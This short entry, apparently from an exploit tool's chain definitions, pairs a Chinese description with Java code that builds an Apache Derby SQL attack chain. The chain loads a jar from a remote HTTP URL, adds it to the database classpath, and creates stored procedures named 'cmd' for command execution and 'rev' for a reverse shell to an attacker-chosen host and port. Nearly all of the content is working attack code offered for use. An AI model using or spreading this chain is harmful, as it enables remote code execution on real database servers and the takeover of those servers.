data.description:
本链会从远程获取jar包并初始化，注意这里不会RCE，后续RCE需要调用里面的函数
总共4条sql语句，加载jar包、创建PROCEDURE
sqlList.add("CALL SQLJ.INSTALL_JAR('" + jarHttpUrl +"', 'APP." + className + "', 0)");
sqlList.add("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')");
sqlList.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
sqlList.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");
